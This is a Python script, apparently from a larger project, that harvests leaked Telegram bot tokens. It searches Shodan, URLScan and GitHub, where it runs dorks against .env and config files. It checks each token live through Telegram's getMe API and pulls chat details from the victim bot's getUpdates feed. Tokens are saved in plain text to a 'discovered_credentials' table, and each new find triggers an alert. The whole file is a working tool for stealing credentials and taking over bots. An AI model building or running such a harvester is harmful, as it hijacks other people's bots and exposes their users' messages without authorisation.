import asyncio
import sys
import os
import hashlib
import time

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.core.database import db
from app.core.security import security
from app.services.scanners import ShodanService, GithubService, UrlScanService
from app.services.broadcaster_srv import broadcaster_service

# Initialize Services (Fofa/Censys/HybridAnalysis REMOVED - API access issues)
shodan = ShodanService()
github = GithubService()
urlscan = UrlScanService()

def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()

async def save_manifest(results, source_name: str, verbose=True):
    """
    Validates token format and checks if bot is active via Telegram API.
    Saves if token passes format check AND getMe - does NOT require chats.
    """
    import requests
    from app.services.scanners import _is_valid_token
    
    saved_count = 0
    for item in results:
        token = item.get("token")
        if not token or token == "MANUAL_REVIEW_REQUIRED":
            continue
        
        # Step 1: Validate token format (reject Fernet/hashes)
        if not _is_valid_token(token):
            if verbose:
                print(f"  ❌ Invalid token format (Fernet/hash?): {token[:20]}...")
            continue
        
        token_hash = _calculate_hash(token)
        existing_id = None
        existing_has_chat = False
        
        try:
            # Step 2: Check if already exists
            existing = db.table("discovered_credentials").select("id, chat_id").eq("token_hash", token_hash).execute()
            if existing.data:
                existing_id = existing.data[0]['id']
                existing_has_chat = existing.data[0].get('chat_id') is not None
                if existing_has_chat:
                    if verbose:
                        print(f"  ⏭️ Token already exists with chat_id, skipping.")
                    continue
                else:
                    if verbose:
                        print(f"  🔄 Token exists but no chat_id, will update if we find one...")
            
            # Step 3: Validate token with Telegram getMe API (NO CHAT REQUIRED)
            if verbose:
                print(f"  🔍 Validating token {token[:15]}... via Bot API")
            
            base_url = f"https://api.telegram.org/bot{token}"
            me_res = requests.get(f"{base_url}/getMe", timeout=10)
            
            if me_res.status_code != 200 or not me_res.json().get('ok'):
                if verbose:
                    print(f"  ❌ Token invalid or revoked")
                continue
            
            bot_info = me_res.json().get('result', {})
            bot_username = bot_info.get('username', 'unknown')
            if verbose:
                print(f"  ✅ Token valid! Bot: @{bot_username}")
            
            # Step 4: Try to get a chat_id from getUpdates (optional - best effort)
            chat_id = None
            chat_name = None
            chat_type = None
            
            try:
                updates_res = requests.get(f"{base_url}/getUpdates", params={'limit': 10}, timeout=10)
                if updates_res.status_code == 200 and updates_res.json().get('ok'):
                    updates = updates_res.json().get('result', [])
                    for update in updates:
                        for key in ['message', 'channel_post', 'my_chat_member']:
                            if key in update and update[key].get('chat'):
                                chat = update[key]['chat']
                                chat_id = chat.get('id')
                                chat_name = chat.get('title') or chat.get('username') or chat.get('first_name')
                                chat_type = chat.get('type')
                                break
                        if chat_id:
                            break
            except:
                pass
            
            # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)
            
            if existing_id and chat_id:
                # UPDATE existing record with new chat_id
                update_data = {
                    "chat_id": chat_id,
                    "status": "active",
                    "meta": {
                        **item.get("meta", {}),
                        "bot_username": bot_username,
                        "bot_id": bot_info.get('id'),
                        "chat_name": chat_name,
                        "chat_type": chat_type
                    }
                }
                db.table("discovered_credentials").update(update_data).eq("id", existing_id).execute()
                if verbose:
                    print(f"  🔄 [UPDATED] Credential ID: {existing_id} - now has chat_id!")
                await broadcaster_service.send_log(
                    f"🔄 [{source_name}] **Updated Token!**\n"
                    f"Bot: @{bot_username}\n"
                    f"ID: `{existing_id}`\n"
                    f"Chat: {chat_name} ({chat_type})"
                )
                saved_count += 1
            elif existing_id and not chat_id:
                # Token exists, still no chat - skip
                if verbose:
                    print(f"  ⏭️ Token exists, still no chat_id found, skipping update.")
            else:
                # INSERT new record
                data = {
                    "bot_token": token,  # Store in plain text
                    "token_hash": token_hash,
                    "chat_id": chat_id,
                    "source": source_name,
                    "status": "pending" if not chat_id else "active",
                    "meta": {
                        **item.get("meta", {}),
                        "bot_username": bot_username,
                        "bot_id": bot_info.get('id'),
                        "chat_name": chat_name,
                        "chat_type": chat_type
                    }
                }
                
                res = db.table("discovered_credentials").insert(data).execute()
                
                if res.data:
                    status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING (no chat)"
                    if verbose:
                        print(f"  🎯 [NEW] Saved Credential ID: {res.data[0]['id']} - {status_label}")
                    await broadcaster_service.send_log(
                        f"🎯 [{source_name}] **New Bot Token!**\n"
                        f"Bot: @{bot_username}\n"
                        f"Status: {status_label}"
                    )
                    saved_count += 1
                
        except Exception as e:
            if verbose: print(f"  ❌ Save Error: {e}")
            pass
    return saved_count

async def run_scanners():
    print("🚀 Starting LOCAL OSINT Scan (URLScan, GitHub, Shodan)...")
    await broadcaster_service.send_log("🚀 **Manual Scan Started** (Local Script)")
    print("-------------------------------------------------")

    # 1. Shodan
    print("\n🌎 [Shodan] Starting Scan...")
    shodan_queries = [
        "http.html:\"api.telegram.org\"",
        "http.html:\"bot_token\"", 
        "http.title:\"Telegram Bot\"",
        "http.title:\"Telegram Login\""
    ]
    
    for q in shodan_queries:
        print(f"  > Querying: {q}")
        try:
            results = shodan.search(q)
            count = await save_manifest(results, "shodan")
            print(f"    ✅ Saved {count} new credentials (from {len(results)} hits).")
            time.sleep(1)
        except Exception as e:
            print(f"    ❌ Error: {e}")

    # 2. URLScan
    print("\n🔍 [URLScan] Starting Scan...")
    try:
        query = "api.telegram.org"
        print(f"  > Query: {query}")
        print("  > Note: Deep scanning each result URL for tokens")
        results = urlscan.search(query)
        count = await save_manifest(results, "urlscan")
        print(f"  ✅ Saved {count} new credentials (from {len(results)} hits).")
    except Exception as e:
        print(f"  ❌ URLScan Error: {e}")

    # 3. GitHub
    print("\n🐱 [GitHub] Starting Scan...")
    dorks = [
        "filename:.env api.telegram.org",
        "path:config api.telegram.org",
        "\"TELEGRAM_BOT_TOKEN\"",
        "language:python \"ApplicationBuilder\" \"token\"",
        "language:python \"Telethon\" \"api_id\"",
        "filename:config.json \"bot_token\"",
        "filename:settings.py \"TELEGRAM_TOKEN\"",
        "\"api.telegram.org\""
    ]
    
    total_gh = 0
    for i, dork in enumerate(dorks):
        print(f"  > Dorking: {dork}")
        try:
            results = github.search(dork)
            count = await save_manifest(results, "github")
            total_gh += count
            print(f"    Found {len(results)} matches, {count} new.")
        except Exception as e:
            print(f"    ❌ Error: {e}")
        
        if i < len(dorks) - 1:
            time.sleep(2) # Respect rate limits slightly

    print("\n-------------------------------------------------")
    print("🏁 Full Scan Complete.")
    await broadcaster_service.send_log("🏁 **Manual Scan Complete.** Check Monitor Group for details.")
    print("   Check your Railway Worker logs (General Topic) for Enrichment alerts!")
    print("   (The worker will see the new 'pending' rows and enrich them automatically)")

if __name__ == "__main__":
    asyncio.run(run_scanners())
